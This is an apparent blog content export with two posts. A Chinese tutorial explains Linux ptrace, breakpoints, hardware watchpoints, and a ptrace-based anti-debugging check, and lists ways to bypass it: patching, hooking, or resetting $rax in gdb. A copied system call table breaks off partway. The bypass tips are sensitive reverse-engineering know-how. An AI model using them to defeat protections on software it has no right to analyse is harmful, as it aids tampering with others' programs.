{"meta":{"title":"Firework","subtitle":"","description":"Less_is_more","author":"Firework","url":"http://example.com","root":"/"},"pages":[{"title":"分类","date":"2021-04-08T07:14:19.440Z","updated":"2021-04-08T07:14:19.423Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-04-08T07:15:38.000Z","updated":"2021-04-08T07:16:14.735Z","comments":true,"path":"link/index.html","permalink":"http://example.com/link/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-04-18T02:39:43.930Z","updated":"2021-04-08T07:13:42.893Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Ptrace原理与反调试","slug":"Ptrace原理与反调试","date":"2022-03-25T14:33:05.012Z","updated":"2022-03-25T16:52:01.651Z","comments":true,"path":"2022/03/25/Ptrace原理与反调试/","link":"","permalink":"http://example.com/2022/03/25/Ptrace%E5%8E%9F%E7%90%86%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95/","excerpt":"","text":"ptracedefinition123456789101112131415161718The ptrace() system call provides a means by which one process(the &quot;tracer&quot;) may observe and control the execution of anotherprocess (the &quot;tracee&quot;), and examine and change the tracee&#39;smemory and registers. It is primarily used to implementbreakpoint debugging and system call tracing.A tracee first needs to be attached to the tracer. Attachmentand subsequent commands are per thread: in a multithreadedprocess, every thread can be individually attached to a(potentially different) tracer, or left not attached and thus notdebugged. Therefore, &quot;tracee&quot; always means &quot;(one) thread&quot;, never&quot;a (possibly multithreaded) process&quot;. Ptrace commands are alwayssent to a specific tracee using a call of the form ptrace(PTRACE_foo, pid, ...)where pid is the thread ID of the corresponding Linux thread. arguments &amp; descriptions1long ptrace(enum __ptrace_request request, pid_t pid,void *addr, void *data); request ：request的值确定要执行的操作，可以取以下值 1234567891011121314151617PTRACE_TRACEME, 本进程被其父进程所跟踪。其父进程应该希望跟踪子进程PTRACE_PEEKTEXT, 从内存地址中读取一个字节，内存地址由addr给出PTRACE_PEEKDATA, 同上PTRACE_PEEKUSER, 可以检查用户态内存区域(USER area),从USER区域中读取一个字节，偏移量为addrPTRACE_POKETEXT, 往内存地址中写入一个字节。内存地址由addr给出PTRACE_POKEDATA, 往内存地址中写入一个字节。内存地址由addr给出PTRACE_POKEUSER, 往USER区域中写入一个字节，偏移量为addrPTRACE_GETREGS, 读取寄存器PTRACE_GETFPREGS, 读取浮点寄存器PTRACE_SETREGS, 设置寄存器PTRACE_SETFPREGS, 设置浮点寄存器PTRACE_CONT, 重新运行PTRACE_SYSCALL, 使被调试进程继续运行,但是在下一个系统调用的入口处或出口处停下,或者是执行完一条指令后停下.例如,调试进程可以监视被调试进程系统调用入口处的参数,接着再使用SYSCALL,监视系统调用的返回值.PTRACE_SINGLESTEP, 设置单步执行标志PTRACE_ATTACH，追踪指定pid的进程PTRACE_DETACH， 结束追踪 第二参数 pid ：指示ptrace要跟踪的进程。 第三参数 addr ：指定ptrace要读取or监控的内存地址。 第四参数 data ：如果我们要向目标进程写入数据，那么data是我们要写入的数据；如果我们从目标进程中读出数据，那么读出的数据放在data。 demo: 1234567891011121314151617181920212223242526272829303132333435#include &lt;sys/ptrace.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/reg.h&gt; /* For constants ORIG_RAX etc */#include &lt;stdio.h&gt;int main()&#123; char * argv[ ]=&#123;&quot;ls&quot;,&quot;-al&quot;,&quot;/etc/passwd&quot;,(char *)0&#125;; char * envp[ ]=&#123;&quot;PATH=/bin&quot;,0&#125;; pid_t child; long orig_rax; child = fork(); if(child == 0) &#123; ptrace(PTRACE_TRACEME, 0, NULL, NULL); printf(&quot;Try to call: execl\\n&quot;); execve(&quot;/bin/ls&quot;,argv,envp); printf(&quot;child exit\\n&quot;); &#125; else &#123; wait(NULL); //等待子进程 orig_rax = ptrace(PTRACE_PEEKUSER, child, 8 * ORIG_RAX, NULL); printf(&quot;The child made a &quot; &quot;system call %ld\\n&quot;, orig_rax); ptrace(PTRACE_CONT, child, NULL, NULL); printf(&quot;Try to call:ptrace\\n&quot;); &#125; return 0;&#125; ptrace工作原理 通过 copy_from_user copy_to_user 读取与修改数据。 通过 copy_regset_from/to_user 访问寄存器。而寄存器数据保存在 task struct 中。 单步（Single Stepping）：每步进(step)一次，CPU会一直执行到有分支、中断或异常。而ptrace通过设置对应的标志位在进程的thread_info.flags和MSR中打标启用单步调试。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253void user_enable_single_step(struct task_struct *child)&#123; enable_step(child, 0);&#125;/* * Enable single or block step. */static void enable_step(struct task_struct *child, bool block)&#123; /* * Make sure block stepping (BTF) is not enabled unless it should be. * Note that we don&#x27;t try to worry about any is_setting_trap_flag() * instructions after the first when using block stepping. * So no one should try to use debugger block stepping in a program * that uses user-mode single stepping itself. */ if (enable_single_step(child) &amp;&amp; block) set_task_blockstep(child, true); else if (test_tsk_thread_flag(child, TIF_BLOCKSTEP)) set_task_blockstep(child, false);&#125;在 enable_single_step 中设置了 X86_EFLAGS_TF 以及 TIF_SINGLESTEP 标志位。 在 test_tsk_thread_flag 中检查了对应进程 thread_info中的 TIF_BLOCKSTEP 标志位。void set_task_blockstep(struct task_struct *task, bool on)&#123; unsigned long debugctl; local_irq_disable(); debugctl = get_debugctlmsr(); if (on) &#123; debugctl |= DEBUGCTLMSR_BTF; set_tsk_thread_flag(task, TIF_BLOCKSTEP); &#125; else &#123; debugctl &amp;= ~DEBUGCTLMSR_BTF; clear_tsk_thread_flag(task, TIF_BLOCKSTEP); &#125; if (task == current) update_debugctlmsr(debugctl); local_irq_enable();&#125;接下来在 set_task_blockstep 中设置或清除了 DEBUGCTLMSR_BTF 以及 对应thread info的 TIF_BLOCKSTEP 。 breakpoints原理breakpoints并不是ptrace的实现的一部分。并且，当处于attach和traceme状态下，交付给tracee的任何信号首先都会被GDB截获。 那么GDB会做如下事情。 1.读取addr处的指令的位置，存入GDB维护的断点链表中。 2.将中断指令 INT 3 （0xCC）打入原本的addr处。也就是将addr处的指令掉换成INT 3 3.当执行到addr处（INT 3）时，CPU执行这条指令的过程也就是发生断点异常（breakpoint exception），tracee产生一个SIGTRAP，此时我们处于attach模式下，tracee的SIGTRAP会被tracer（GDB）捕捉。然后GDB去他维护的断点链表中查找对应的位置，如果找到了，说明hit到了breakpoint。 4.接下来，如果我们想要tracee继续正常运行，GDB将INT 3指令换回原来正常的指令，回退重新运行正常指令，然后接着运行。 watchpoint（硬件断点）原理在GDB中另一个非常有用的是watch命令。用于监控某一内存位置或者寄存器的变化. watch的实现与CPU的相关寄存器有关。我们以80386为例。 存在DR0到DR7这八个特殊的寄存器来实现硬件断点。 （1）DR0-DR3：每个寄存器都保存着对应条件断点的线性地址。而每个断点更进一步的信息储存在DR7中。需要注意的是，由于储存的是线性地址，所以是否开启分页是不影响的。如果开启paging，那么线性地址由mmu转换到物理地址；否则线性地址与物理地址等效。 （2）DR7 调试控制寄存器debug control：DR7的低八位（0、2、4、6和1、3、5、7）有选择地启用四个条件断点。启用级别有两个：本地（0,2,4,6）和全局（1,3,5,7）。处理器会在每个任务切换时自动重置本地启用位，以避免在新任务中出现不必要的断点情况。全局启用位不会由任务开关重置；因此，它们可以用于所有任务的全局条件。 16-17位（对应于DR0），20-21（DR1），24-25（DR2），28-29（DR3）定义了断点触发的时间。每个断点都有一个两位对应，用于指定它们是在执行（00b），数据写入（01b），数据读取还是写入（11b）时中断。10b被定义为表示IO读取或写入中断，但没有硬件支持它。位18-19（DR0），22-23（DR1），26-27（DR2），30-31（DR3）定义了断点监视多大的内存区域。同样，每个断点都有一个两位对应，指定他们watch一个（00b），两个（01b），八（10b）还是四（11b）个字节。 （3）DR6 调试状态寄存器：告诉调试器哪些断点已经发生了。 反调试通过基于ptrace的GDB我们可以对程序进行调试，那么为了防止别人调试我们的程序，也就有了反调试技术。 竞争调试&amp;绕过思路123456789101112#include &lt;sys/ptrace.h&gt;#include &lt;stdio.h&gt;int main()&#123; if (ptrace(PTRACE_TRACEME, 0, 0, 0) ==-1 ) &#123; printf(&quot;don&#x27;t trace me:(\\n&quot;); return 1; &#125; printf(&quot;no one trace me:)\\n&quot;); return 0;&#125; 当我们调试该程序的时候，gdb已经附加在该进程，再次执行ptrace(PTRACE_TRACEME, 0, 0, 0)时，由于每个进程只能被PTRACE_TRACEME一次，因此只要程序的开头就先执行一次ptrace(PTRACE_TRACEME, 0, 0, 0)，当gdb再想attach的时候就会发现已经执行了一次不能再执行了从而返回-1。 解决思路： patch掉程序中ptrace程序 利用hook替换ptrace为自定义函数 用gdb的catch命令,catch syscall ptrace会在发生ptrace调用的时候停下，因此在第二次停住的时候set $rax=0，从而绕过程序中ptrace(PTRACE_TRACEME, 0, 0, 0) ==-1的判断。","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}]},{"title":"SystemcallABI","slug":"SystemcallABI","date":"2022-02-02T17:37:04.000Z","updated":"2022-03-25T17:43:42.917Z","comments":true,"path":"2022/02/03/SystemcallABI/","link":"","permalink":"http://example.com/2022/02/03/SystemcallABI/","excerpt":"","text":"系统调用权威指南The Definitive Guide to Linux System Calls Linux System Call TableWarning: This document is old &amp; has moved. Please update any links:https://chromium.googlesource.com/chromiumos/docs/+/HEAD/constants/syscalls.md These are the system call numbers (NR) and their corresponding symbolic names. These vary significantly across architectures/ABIs, both in mappings and in actual name. This is a quick reference for people debugging things (e.g. seccomp failures). For more details on syscalls in general, see the syscall(2) man page. ContentsRandom Names Kernel Implementations Calling Conventions Tables x86_64 (64-bit) arm (32-bit/EABI) arm64 (64-bit) x86 (32-bit) Cross-arch Numbers Random NamesDepending on the environment you’re in, syscall names might use slightly different naming conventions. The kernel headers (e.g. asm/unistd.h) use names like __NR_xxx, but don’t provide any other utility code. The C library headers (e.g. syscall.h &amp; sys/syscall.h) use names like SYS_xxx with the intention they be used with syscall(...). These defines will be exactly the same — so __NR_foo will have the same value as SYS_foo. Which one a developer chooses to use is a bit arbitrary, and most likely belies their background (with kernel developers tending towards __NR_xxx). If you’re writing userland C code and the syscall(...) function, you probably should stick to SYS_xxx instead. The short name “NR” itself just refers to “number”. You might see “syscall number” and “NR” and “syscall NR” used interchangeably. Another fun difference is that some architectures namespace syscalls that are specific to their port in some way. Or they don‘t. It’s another situation of different kernel maintainers making different choices and there not being a central authority who noticed &amp; enforced things. For example, ARM has a few __ARM_NR_xxx syscalls that they consider “private”, and they have a few __NR_arm_xxx syscalls to indicate that they have a custom wrapper around the xxx syscall! Another edge case to keep in mind is that different architectures might use the same name for different entry points. It‘s uncommon, but can come up when looking at syscalls with variants. For example, an older architecture port might have setuid &amp; setuid32 while newer ones only have setuid. The older port’s setuid takes a 16-bit argument while the newer port’s setuid takes a 32-bit argument and is equivalent to setuid32. There are many parallels with filesystem calls like statfs &amp; statfs64. Kernel ImplementationsThe cs/ links to kernel sources are mostly best effort. They focus on the common C entry point, but depending on your execution environment, that might not be the first place the kernel executes. Unfortunately, they‘re Google-internal only currently as we haven’t found any good public indexes to point to instead. Every architecture may point a syscall from its initial entry point to custom trampoline code. For example, ARM‘s fstatfs64 implementation starts execution in sys_fstatfs64_wrapper which lives under arch/arm/ as assembly code. That in turn calls sys_fstatfs64 which is C code in the common fs/ tree. Usually these trampolines are not complicated, but they might add an extra check to overall execution. If you’re seeing confusing behavior related to the C code, you might want to dive deeper. When working with 32-bit ABIs on 64-bit kernels, you might run into the syscall compat layers which try to swizzle structures. This shows up a lot on x86 &amp; ARM systems where the userland is 32-bit but the kernel is 64-bit. These will use conventions like compat_sys_xxx instead of sys_xxx, and COMPAT_SYSCALL_XXX wrappers instead of SYSCALL_XXX. They‘re responsible for taking the 32-bit structures from userland, converting them to the 64-bit structures the kernel uses, then calling the 64-bit C code. Normally this conversion is not a problem, but if the code detects issues with the data structures, it’ll error out before the common implementation of the syscall is ever executed. The Android/ARC++ container executes under the alt-syscall layer. This allows defining of a custom syscall table for the purpose of hard disabling any syscalls for all processes (without needing seccomp), or for adding extra checks to the entry/exit points of the common implementation, or stubbing things out regardless of any arguments. All of this code will run before the common implementation of the syscall is ever executed. Since the tables are hand maintained in our kernel (and not upstream), new syscalls aren‘t added to the whitelist automatically, so you might see confusing errors like ENOSYS, but only when run inside of the container. If you’re seeing misbehavior, you should check to see if alt-syscall is enabled for the process, and if so, look at the wrappers under security/chromiumos/. Calling ConventionsHere’s a cheat sheet for the syscall calling convention for arches supported by Chrome OS. These are useful when looking at seccomp failures in minidumps. This is only meant as a cheat sheet for people writing seccomp filters, or similar low level tools. It is not a complete reference for the entire calling convention for each architecture as that can be extremely nuanced &amp; complicated. If you need that level of detail, you should start with the syscall(2) notes, and then check out the respective psABI (Processor Specific Application Binary Interface) supplemental chapters. The arg0 names below match minijail‘s seccomp filter syntax. It’s not uncommon for source code to count from 1 instead of 0, so be aware as you go spelunking into implementations. arch syscall NR return arg0 arg1 arg2 arg3 arg4 arg5 arm r7 r0 r0 r1 r2 r3 r4 r5 arm64 x8 x0 x0 x1 x2 x3 x4 x5 x86 eax eax ebx ecx edx esi edi ebp x86_64 rax rax rdi rsi rdx r10 r8 r9 Tablesx86_64 (64-bit)Compiled from Linux 4.14.0 headers. NR syscall name references %rax arg0 (%rdi) arg1 (%rsi) arg2 (%rdx) arg3 (%r10) arg4 (%r8) arg5 (%r9) 0 read man/ cs/ 0x00 unsigned int fd char *buf size_t count - - - 1 write man/ cs/ 0x01 unsigned int fd const char *buf size_t count - - - 2 open man/ cs/ 0x02 const char *filename int flags umode_t mode - - - 3 close man/ cs/ 0x03 unsigned int fd - - - - - 4 stat man/ cs/ 0x04 const char *filename struct __old_kernel_stat *statbuf - - - - 5 fstat man/ cs/ 0x05 unsigned int fd struct __old_kernel_stat *statbuf - - - - 6 lstat man/ cs/ 0x06 const char *filename struct __old_kernel_stat *statbuf - - - - 7 poll man/ cs/ 0x07 struct pollfd *ufds unsigned int nfds int timeout - - - 8 lseek man/ cs/ 0x08 unsigned int fd off_t offset unsigned int whence - - - 9 mmap man/ cs/ 0x09 ? ? ? ? ? ? 10 mprotect man/ cs/ 0x0a unsigned long start size_t len unsigned long prot - - - 11 munmap man/ cs/ 0x0b unsigned long addr size_t len - - - - 12 brk man/ cs/ 0x0c unsigned long brk - - - - - 13 rt_sigaction man/ cs/ 0x0d int const struct sigaction * struct sigaction * size_t - - 14 rt_sigprocmask man/ cs/ 0x0e int how sigset_t *set sigset_t *oset size_t sigsetsize - - 15 rt_sigreturn man/ cs/ 0x0f ? ? ? ? ? ? 16 ioctl man/ cs/ 0x10 unsigned int fd unsigned int cmd unsigned long arg - - - 17 pread64 man/ cs/ 0x11 unsigned int fd char *buf size_t count loff_t pos - - 18 pwrite64 man/ cs/ 0x12 unsigned int fd const char *buf size_t count loff_t pos - - 19 readv man/ cs/ 0x13 unsigned long fd const struct iovec *vec unsigned long vlen - - - 20 writev man/ cs/ 0x14 unsigned long fd const struct iovec *vec unsigned long vlen - - - 21 access man/ cs/ 0x15 const char *filename int mode - - - - 22 pipe man/ cs/ 0x16 int *fildes - - - - - 23 select man/ cs/ 0x17 int n fd_set *inp fd_set *outp fd_set *exp struct timeval *tvp - 24 sched_yield man/ cs/ 0x18 - - - - - - 25 mremap man/ cs/ 0x19 unsigned long addr unsigned long old_len unsigned long new_len unsigned long flags unsigned long new_addr - 26 msync man/ cs/ 0x1a unsigned long start size_t len int flags - - - 27 mincore man/ cs/ 0x1b unsigned long start size_t len unsigned char * vec - - - 28 madvise man/ cs/ 0x1c unsigned long start size_t len int behavior - - - 29 shmget man/ cs/ 0x1d key_t key size_t size int flag - - - 30 shmat man/ cs/ 0x1e int shmid char *shmaddr int shmflg - - - 31 shmctl man/ cs/ 0x1f int shmid int cmd struct shmid_ds *buf - - - 32 dup man/ cs/ 0x20 unsigned int fildes - - - - - 33 dup2 man/ cs/ 0x21 unsigned int oldfd unsigned int newfd - - - - 34 pause man/ cs/ 0x22 - - - - - - 35 nanosleep man/ cs/ 0x23 struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - - - - 36 getitimer man/ cs/ 0x24 int which struct itimerval *value - - - - 37 alarm man/ cs/ 0x25 unsigned int seconds - - - - - 38 setitimer man/ cs/ 0x26 int which struct itimerval *value struct itimerval *ovalue - - - 39 getpid man/ cs/ 0x27 - - - - - - 40 sendfile man/ cs/ 0x28 int out_fd int in_fd off_t *offset size_t count - - 41 socket man/ cs/ 0x29 int int int - - - 42 connect man/ cs/ 0x2a int struct sockaddr * int - - - 43 accept man/ cs/ 0x2b int struct sockaddr * int * - - - 44 sendto man/ cs/ 0x2c int void * size_t unsigned struct sockaddr * int 45 recvfrom man/ cs/ 0x2d int void * size_t unsigned struct sockaddr * int * 46 sendmsg man/ cs/ 0x2e int fd struct user_msghdr *msg unsigned flags - - - 47 recvmsg man/ cs/ 0x2f int fd struct user_msghdr *msg unsigned flags - - - 48 shutdown man/ cs/ 0x30 int int - - - - 49 bind man/ cs/ 0x31 int struct sockaddr * int - - - 50 listen man/ cs/ 0x32 int int - - - - 51 getsockname man/ cs/ 0x33 int struct sockaddr * int * - - - 52 getpeername man/ cs/ 0x34 int struct sockaddr * int * - - - 53 socketpair man/ cs/ 0x35 int int int int * - - 54 setsockopt man/ cs/ 0x36 int fd int level int optname char *optval int optlen - 55 getsockopt man/ cs/ 0x37 int fd int level int optname char *optval int *optlen - 56 clone man/ cs/ 0x38 unsigned long unsigned long int * int * unsigned long - 57 fork man/ cs/ 0x39 - - - - - - 58 vfork man/ cs/ 0x3a - - - - - - 59 execve man/ cs/ 0x3b const char *filename const char const argv const char const envp - - - 60 exit man/ cs/ 0x3c int error_code - - - - - 61 wait4 man/ cs/ 0x3d pid_t pid int *stat_addr int options struct rusage *ru - - 62 kill man/ cs/ 0x3e pid_t pid int sig - - - - 63 uname man/ cs/ 0x3f struct old_utsname * - - - - - 64 semget man/ cs/ 0x40 key_t key int nsems int semflg - - - 65 semop man/ cs/ 0x41 int semid struct sembuf *sops unsigned nsops - - - 66 semctl man/ cs/ 0x42 int semid int semnum int cmd unsigned long arg - - 67 shmdt man/ cs/ 0x43 char *shmaddr - - - - - 68 msgget man/ cs/ 0x44 key_t key int msgflg - - - - 69 msgsnd man/ cs/ 0x45 int msqid struct msgbuf *msgp size_t msgsz int msgflg - - 70 msgrcv man/ cs/ 0x46 int msqid struct msgbuf *msgp size_t msgsz long msgtyp int msgflg - 71 msgctl man/ cs/ 0x47 int msqid int cmd struct msqid_ds *buf - - - 72 fcntl man/ cs/ 0x48 unsigned int fd unsigned int cmd unsigned long arg - - - 73 flock man/ cs/ 0x49 unsigned int fd unsigned int cmd - - - - 74 fsync man/ cs/ 0x4a unsigned int fd - - - - - 75 fdatasync man/ cs/ 0x4b unsigned int fd - - - - - 76 truncate man/ cs/ 0x4c const char *path long length - - - - 77 ftruncate man/ cs/ 0x4d unsigned int fd unsigned long length - - - - 78 getdents man/ cs/ 0x4e unsigned int fd struct linux_dirent *dirent unsigned int count - - - 79 getcwd man/ cs/ 0x4f char *buf unsigned long size - - - - 80 chdir man/ cs/ 0x50 const char *filename - - - - - 81 fchdir man/ cs/ 0x51 unsigned int fd - - - - - 82 rename man/ cs/ 0x52 const char *oldname const char *newname - - - - 83 mkdir man/ cs/ 0x53 const char *pathname umode_t mode - - - - 84 rmdir man/ cs/ 0x54 const char *pathname - - - - - 85 creat man/ cs/ 0x55 const char *pathname umode_t mode - - - - 86 link man/ cs/ 0x56 const char *oldname const char *newname - - - - 87 unlink man/ cs/ 0x57 const char *pathname - - - - - 88 symlink man/ cs/ 0x58 const char *old const char *new - - - - 89 readlink man/ cs/ 0x59 const char *path char *buf int bufsiz - - - 90 chmod man/ cs/ 0x5a const char *filename umode_t mode - - - - 91 fchmod man/ cs/ 0x5b unsigned int fd umode_t mode - - - - 92 chown man/ cs/ 0x5c const char *filename uid_t user gid_t group - - - 93 fchown man/ cs/ 0x5d unsigned int fd uid_t user gid_t group - - - 94 lchown man/ cs/ 0x5e const char *filename uid_t user gid_t group - - - 95 umask man/ cs/ 0x5f int mask - - - - - 96 gettimeofday man/ cs/ 0x60 struct timeval *tv struct timezone *tz - - - - 97 getrlimit man/ cs/ 0x61 unsigned int resource struct rlimit *rlim - - - - 98 getrusage man/ cs/ 0x62 int who struct rusage *ru - - - - 99 sysinfo man/ cs/ 0x63 struct sysinfo *info - - - - - 100 times man/ cs/ 0x64 struct tms *tbuf - - - - - 101 ptrace man/ cs/ 0x65 long request long pid unsigned long addr unsigned long data - - 102 getuid man/ cs/ 0x66 - - - - - - 103 syslog man/ cs/ 0x67 int type char *buf int len - - - 104 getgid man/ cs/ 0x68 - - - - - - 105 setuid man/ cs/ 0x69 uid_t uid - - - - - 106 setgid man/ cs/ 0x6a gid_t gid - - - - - 107 geteuid man/ cs/ 0x6b - - - - - - 108 getegid man/ cs/ 0x6c - - - - - - 109 setpgid man/ cs/ 0x6d pid_t pid pid_t pgid - - - - 110 getppid man/ cs/ 0x6e - - - - - - 111 getpgrp man/ cs/ 0x6f - - - - - - 112 setsid man/ cs/ 0x70 - - - - - - 113 setreuid man/ cs/ 0x71 uid_t ruid uid_t euid - - - - 114 setregid man/ cs/ 0x72 gid_t rgid gid_t egid - - - - 115 getgroups man/ cs/ 0x73 int gidsetsize gid_t *grouplist - - - - 116 setgroups man/ cs/ 0x74 int gidsetsize gid_t *grouplist - - - - 117 setresuid man/ cs/ 0x75 uid_t ruid uid_t euid uid_t suid - - - 118 getresuid man/ cs/ 0x76 uid_t *ruid uid_t *euid uid_t *suid - - - 119 setresgid man/ cs/ 0x77 gid_t rgid gid_t egid gid_t sgid - - - 120 getresgid man/ cs/ 0x78 gid_t *rgid gid_t *egid gid_t *sgid - - - 121 getpgid man/ cs/ 0x79 pid_t pid - - - - - 122 setfsuid man/ cs/ 0x7a uid_t uid - - - - - 123 setfsgid man/ cs/ 0x7b gid_t gid - - - - - 124 getsid man/ cs/ 0x7c pid_t pid - - - - - 125 capget man/ cs/ 0x7d cap_user_header_t header cap_user_data_t dataptr - - - - 126 capset man/ cs/ 0x7e cap_user_header_t header const cap_user_data_t data - - - - 127 rt_sigpending man/ cs/ 0x7f sigset_t *set size_t sigsetsize - - - - 128 rt_sigtimedwait man/ cs/ 0x80 const sigset_t *uthese siginfo_t *uinfo const struct __kernel_timespec *uts size_t sigsetsize - - 129 rt_sigqueueinfo man/ cs/ 0x81 pid_t pid int sig siginfo_t *uinfo - - - 130 rt_sigsuspend man/ cs/ 0x82 sigset_t *unewset size_t sigsetsize - - - - 131 sigaltstack man/ cs/ 0x83 const struct sigaltstack *uss struct sigaltstack *uoss - - - - 132 utime man/ cs/ 0x84 char *filename struct utimbuf *times - - - - 133 mknod man/ cs/ 0x85 const char *filename umode_t mode unsigned dev - - - 134 uselib man/ cs/ 0x86 const char *library - - - - - 135 personality man/ cs/ 0x87 unsigned int personality - - - - - 136 ustat man/ cs/ 0x88 unsigned dev struct ustat *ubuf - - - - 137 statfs man/ cs/ 0x89 const char * path struct statfs *buf - - - - 138 fstatfs man/ cs/ 0x8a unsigned int fd struct statfs *buf - - - - 139 sysfs man/ cs/ 0x8b int option unsigned long arg1 unsigned long arg2 - - - 140 getpriority man/ cs/ 0x8c int which int who - - - - 141 setpriority man/ cs/ 0x8d int which int who int niceval - - - 142 sched_setparam man/ cs/ 0x8e pid_t pid struct sched_param *param - - - - 143 sched_getparam man/ cs/ 0x8f pid_t pid struct sched_param *param - - - - 144 sched_setscheduler man/ cs/ 0x90 pid_t pid int policy struct sched_param *param - - - 145 sched_getscheduler man/ cs/ 0x91 pid_t pid - - - - - 146 sched_get_priority_max man/ cs/ 0x92 int policy - - - - - 147 sched_get_priority_min man/ cs/ 0x93 int policy - - - - - 148 sched_rr_get_interval man/ cs/ 0x94 pid_t pid struct __kernel_timespec *interval - - - - 149 mlock man/ cs/ 0x95 unsigned long start size_t len - - - - 150 munlock man/ cs/ 0x96 unsigned long start size_t len - - - - 151 mlockall man/ cs/ 0x97 int flags - - - - - 152 munlockall man/ cs/ 0x98 - - - - - - 153 vhangup man/ cs/ 0x99 - - - - - - 154 modify_ldt man/ cs/ 0x9a ? ? ? ? ? ? 155 pivot_root man/ cs/ 0x9b const char *new_root const char *put_old - - - - 156 _sysctl man/ cs/ 0x9c ? ? ? ? ? ? 157 prctl man/ cs/ 0x9d int option unsigned long arg2 unsigned long arg3 unsigned long arg4 unsigned long arg5 - 158 arch_prctl man/ cs/ 0x9e ? ? ? ? ? ? 159 adjtimex man/ cs/ 0x9f struct __kernel_timex *txc_p - - - - - 160 setrlimit man/ cs/ 0xa0 unsigned int resource struct rlimit *rlim - - - - 161 chroot man/ cs/ 0xa1 const char *filename - - - - - 162 sync man/ cs/ 0xa2 - - - - - - 163 acct man/ cs/ 0xa3 const char *name - - - - - 164 settimeofday man/ cs/ 0xa4 struct timeval *tv struct timezone *tz - - - - 165 mount man/ cs/ 0xa5 char *dev_name char *dir_name char *type unsigned long flags void *data - 166 umount2 man/ cs/ 0xa6 ? ? ? ? ? ? 167 swapon man/ cs/ 0xa7 const char *specialfile int swap_flags - - - - 168 swapoff man/ cs/ 0xa8 const char *specialfile - - - - - 169 reboot man/ cs/ 0xa9 int magic1 int magic2 unsigned int cmd void *arg - - 170 sethostname man/ cs/ 0xaa char *name int len - - - - 171 setdomainname man/ cs/ 0xab char *name int len - - - - 172 iopl man/ cs/ 0xac ? ? ? ? ? ? 173 ioperm man/ cs/ 0xad unsigned long from unsigned long num int on - - - 174 create_module man/ cs/ 0xae ? ? ? ? ? ? 175 init_module man/ cs/ 0xaf void *umod unsigned long len const char *uargs - - - 176 delete_module man/ cs/ 0xb0 const char *name_user unsigned int flags - - - - 177 get_kernel_syms man/ cs/ 0xb1 ? ? ? ? ? ? 178 query_module man/ cs/ 0xb2 ? ? ? ? ? ? 179 quotactl man/ cs/ 0xb3 unsigned int cmd const char *special qid_t id void *addr - - 180 nfsservctl man/ cs/ 0xb4 ? ? ? ? ? ? 181 getpmsg man/ cs/ 0xb5 ? ? ? ? ? ? 182 putpmsg man/ cs/ 0xb6 ? ? ? ? ? ? 183 afs_syscall man/ cs/ 0xb7 ? ? ? ? ? ? 184 tuxcall man/ cs/ 0xb8 ? ? ? ? ? ? 185 security man/ cs/ 0xb9 ? ? ? ? ? ? 186 gettid man/ cs/ 0xba - - - - - - 187 readahead man/ cs/ 0xbb int fd loff_t offset size_t count - - - 188 setxattr man/ cs/ 0xbc const char *path const char *name const void *value size_t size int flags - 189 lsetxattr man/ cs/ 0xbd const char *path const char *name const void *value size_t size int flags - 190 fsetxattr man/ cs/ 0xbe int fd const char *name const void *value size_t size int flags - 191 getxattr man/ cs/ 0xbf const char *path const char *name void *value size_t size - - 192 lgetxattr man/ cs/ 0xc0 const char *path const char *name void *value size_t size - - 193 fgetxattr man/ cs/ 0xc1 int fd const char *name void *value size_t size - - 194 listxattr man/ cs/ 0xc2 const char *path char *list size_t size - - - 195 llistxattr man/ cs/ 0xc3 const char *path char *list size_t size - - - 196 flistxattr man/ cs/ 0xc4 int fd char *list size_t size - - - 197 removexattr man/ cs/ 0xc5 const char *path const char *name - - - - 198 lremovexattr man/ cs/ 0xc6 const char *path const char *name - - - - 199 fremovexattr man/ cs/ 0xc7 int fd const char *name - - - - 200 tkill man/ cs/ 0xc8 pid_t pid int sig - - - - 201 time man/ cs/ 0xc9 time_t *tloc - - - - - 202 futex man/ cs/ 0xca u32 *uaddr int op u32 val struct __kernel_timespec *utime u32 *uaddr2 u32 val3 203 sched_setaffinity man/ cs/ 0xcb pid_t pid unsigned int len unsigned long *user_mask_ptr - - - 204 sched_getaffinity man/ cs/ 0xcc pid_t pid unsigned int len unsigned long *user_mask_ptr - - - 205 set_thread_area man/ cs/ 0xcd ? ? ? ? ? ? 206 io_setup man/ cs/ 0xce unsigned nr_reqs aio_context_t *ctx - - - - 207 io_destroy man/ cs/ 0xcf aio_context_t ctx - - - - - 208 io_getevents man/ cs/ 0xd0 aio_context_t ctx_id long min_nr long nr struct io_event *events struct __kernel_timespec *timeout - 209 io_submit man/ cs/ 0xd1 aio_context_t long struct iocb - - - 210 io_cancel man/ cs/ 0xd2 aio_context_t ctx_id struct iocb *iocb struct io_event *result - - - 211 get_thread_area man/ cs/ 0xd3 ? ? ? ? ? ? 212 lookup_dcookie man/ cs/ 0xd4 u64 cookie64 char *buf size_t len - - - 213 epoll_create man/ cs/ 0xd5 int size - - - - - 214 epoll_ctl_old man/ cs/ 0xd6 ? ? ? ? ? ? 215 epoll_wait_old man/ cs/ 0xd7 ? ? ? ? ? ? 216 remap_file_pages man/ cs/ 0xd8 unsigned long start unsigned long size unsigned long prot unsigned long pgoff unsigned long flags - 217 getdents64 man/ cs/ 0xd9 unsigned int fd struct linux_dirent64 *dirent unsigned int count - - - 218 set_tid_address man/ cs/ 0xda int *tidptr - - - - - 219 restart_syscall man/ cs/ 0xdb - - - - - - 220 semtimedop man/ cs/ 0xdc int semid struct sembuf *sops unsigned nsops const struct __kernel_timespec *timeout - - 221 fadvise64 man/ cs/ 0xdd int fd loff_t offset size_t len int advice - - 222 timer_create man/ cs/ 0xde clockid_t which_clock struct sigevent *timer_event_spec timer_t * created_timer_id - - - 223 timer_settime man/ cs/ 0xdf timer_t timer_id int flags const struct __kernel_itimerspec *new_setting struct __kernel_itimerspec *old_setting - - 224 timer_gettime man/ cs/ 0xe0 timer_t timer_id struct __kernel_itimerspec *setting - - - - 225 timer_getoverrun man/ cs/ 0xe1 timer_t timer_id - - - - - 226 timer_delete 